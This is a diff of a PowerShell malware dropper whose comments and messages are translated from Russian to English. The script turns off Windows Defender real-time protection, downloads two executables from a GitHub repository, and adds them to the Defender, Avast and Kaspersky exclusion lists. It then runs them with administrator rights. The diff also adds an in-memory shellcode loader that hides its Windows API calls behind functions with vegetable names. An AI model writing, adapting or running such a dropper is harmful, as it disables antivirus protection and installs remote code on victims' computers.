@@ -1,21 +1,21 @@
-# Функция для отключения защиты в режиме реального времени Windows Defender
+# Function for disabling Windows Defender Real-Time Protection
 function Disable-WindowsDefender-RealTimeProtection {
     try {
         Set-MpPreference -DisableRealtimeMonitoring $true
-        Write-Output "Защита в режиме реального времени Windows Defender отключена."
+        Write-Output "Windows Defender Real-Time Protection disabled."
     } catch {
-        Write-Error "Ошибка при отключении защиты в режиме реального времени Windows Defender: $_"
+        Write-Error "Error disabling Windows Defender Real-Time Protection: $_"
     }
 }
 
-# Функция для добавления файла в исключения Windows Defender
+# Function to add a file to Windows Defender exclusions
 function Add-To-WindowsDefender-Exclusion {
     param (
         [string]$filePath
     )
 
     if (-Not (Test-Path -Path $filePath)) {
-        Write-Warning "Файл $filePath не найден."
+        Write-Warning "File $filePath not found."
         return
     }
 
@@ -23,24 +23,24 @@ function Add-To-WindowsDefender-Exclusion {
         $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 
         if ($currentExclusions -contains $filePath) {
-            Write-Output "Файл $filePath уже добавлен в исключения Windows Defender."
+            Write-Output "File $filePath is already in Windows Defender exclusions."
         } else {
             Add-MpPreference -ExclusionPath $filePath
-            Write-Output "Файл $filePath успешно добавлен в исключения Windows Defender."
+            Write-Output "File $filePath successfully added to Windows Defender exclusions."
         }
     } catch {
-        Write-Error "Ошибка при добавлении файла $filePath в исключения Windows Defender: $_"
+        Write-Error "Error adding file $filePath to Windows Defender exclusions: $_"
     }
 }
 
-# Функция для добавления файла в исключения Avast Antivirus
+# Function to add file to Avast exclusions
 function Add-To-Avast-Exclusion {
     param (
         [string]$filePath
     )
 
     if (-Not (Test-Path -Path $filePath)) {
-        Write-Warning "Файл $filePath не найден."
+        Write-Warning "File $filePath not found."
         return
     }
 
@@ -48,23 +48,23 @@ function Add-To-Avast-Exclusion {
         $avastProcess = Get-Process -Name avast -ErrorAction SilentlyContinue
         if ($avastProcess) {
             Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
-            Write-Output "Файл $filePath успешно добавлен в исключения Avast Antivirus."
+            Write-Output "File $filePath successfully added to Avast exclusions."
         } else {
-            Write-Warning "Avast Antivirus не запущен."
+            Write-Warning "Avast Antivirus not running."
         }
     } catch {
-        Write-Error "Ошибка при добавлении файла $filePath в исключения Avast Antivirus: $_"
+        Write-Error "Error adding file $filePath to Avast exclusions: $_"
     }
 }
 
-# Функция для добавления файла в исключения Kaspersky Antivirus
+# Function to add file to Kaspersky exclusions
 function Add-To-Kaspersky-Exclusion {
     param (
         [string]$filePath
     )
 
     if (-Not (Test-Path -Path $filePath)) {
-        Write-Warning "Файл $filePath не найден."
+        Write-Warning "File $filePath not found."
         return
     }
 
@@ -72,29 +72,29 @@ function Add-To-Kaspersky-Exclusion {
         $kasperskyProcess = Get-Process -Name avp -ErrorAction SilentlyContinue
         if ($kasperskyProcess) {
             Start-Process -FilePath "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com" -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
-            Write-Output "Файл $filePath успешно добавлен в исключения Kaspersky Antivirus."
+            Write-Output "File $filePath successfully added to Kaspersky exclusions."
         } else {
-            Write-Warning "Kaspersky Antivirus не запущен."
+            Write-Warning "Kaspersky Antivirus not running."
         }
     } catch {
-        Write-Error "Ошибка при добавлении файла $filePath в исключения Kaspersky Antivirus: $_"
+        Write-Error "Error adding file $filePath to Kaspersky exclusions: $_"
     }
 }
 
-# Функция для разблокировки файлов
+# Function to unblock file
 function Unblock-FileIfBlocked {
     param (
         [string]$filePath
     )
     if (Test-Path -Path $filePath) {
         Unblock-File -Path $filePath
-        Write-Output "Файл $filePath разблокирован."
+        Write-Output "File $filePath unblocked."
     } else {
-        Write-Warning "Файл $filePath не найден или доступ к нему ограничен."
+        Write-Warning "File $filePath not found or access is restricted."
     }
 }
 
-# Функция для установки полного доступа к файлу
+# Function to set full access to file
 function Set-FullAccessTo-File {
     param (
         [string]$filePath
@@ -105,68 +105,74 @@ function Set-FullAccessTo-File {
         $rule = New-Object System.Security.AccessControl.FileSystemAccessRule $permissions
         $acl.AddAccessRule($rule)
         Set-Acl $filePath $acl
-        Write-Output "Полный доступ установлен для файла ${filePath}."
+        Write-Output "Full access set for file ${filePath}."
     } catch {
-        Write-Error "Ошибка при установке полного доступа для файла ${filePath}: $_"
+        Write-Error "Error setting full access for file ${filePath}: $_"
     }
 }
 
-# Пути к файлам
+# Downloading files
 $file1 = "C:\1.exe"
 $file2 = "C:\2.exe"
-
-# Отключение защиты в режиме реального времени Windows Defender
-Disable-WindowsDefender-RealTimeProtection
-
-# Загрузка файлов
 try {
     Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile $file1
-    Write-Output "Файл 1.exe успешно загружен."
+    Write-Output "File 1.exe successfully downloaded."
 } catch {
-    Write-Error "Ошибка при загрузке файла 1.exe: $_"
+    Write-Error "Error downloading file 1.exe: $_"
 }
 
 try {
     Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile $file2
-    Write-Output "Файл 2.exe успешно загружен."
+    Write-Output "File 2.exe successfully downloaded."
 } catch {
-    Write-Error "Ошибка при загрузке файла 2.exe: $_"
+    Write-Error "Error downloading file 2.exe: $_"
 }
 
-# Разблокировка файлов перед исключениями
+# Unblocking and setting full access to files
 Unblock-FileIfBlocked -filePath $file1
 Unblock-FileIfBlocked -filePath $file2
-
-# Установка полного доступа к файлам
 Set-FullAccessTo-File -filePath $file1
 Set-FullAccessTo-File -filePath $file2
 
-# Добавление в исключения Windows Defender
+# Adding files to Windows Defender exclusions
 Add-To-WindowsDefender-Exclusion -filePath $file1
 Add-To-WindowsDefender-Exclusion -filePath $file2
 
-# Добавление в исключения Avast Antivirus
+# Adding files to Avast exclusions
 Add-To-Avast-Exclusion -filePath $file1
 Add-To-Avast-Exclusion -filePath $file2
 
-# Добавление в исключения Kaspersky Antivirus
+# Adding files to Kaspersky exclusions
 Add-To-Kaspersky-Exclusion -filePath $file1
 Add-To-Kaspersky-Exclusion -filePath $file2
 
-# Эвазионные техники
-Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
+# Shellcode injection functions
+function potatoes {
+    Param ($cherries, $pineapple)
+    $tomatoes = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $turnips=@()
+    $tomatoes.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$turnips+=$_}}
+    return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($cherries)), $pineapple))
+}
 
-# Обфускация путей
-$obfuscatedPath1 = [System.Convert]::FromBase64String("QzpcMVguZXhl")
-$obfuscatedPath2 = [System.Convert]::FromBase64String("QzpcMngueGV4ZQ==")
+function apples {
+    Param (
+    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+    [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
 
-$decodedPath1 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath1)
-$decodedPath2 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath2)
+$cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+[Byte[]] $buf = <insert shellcode here>
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
+$parsnips =
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)
 
-# Запуск файлов с обфусцированными путями от имени администратора
-Start-Process -FilePath $decodedPath1 -Verb RunAs
-Start-Process -FilePath $decodedPath2 -Verb RunAs
-
-# Завершающий запуск файлов с правами администратора
+# Final execution of files with admin rights
 Start-Process -FilePath $file1 -Verb RunAs
 Start-Process -FilePath $file2 -Verb RunAs
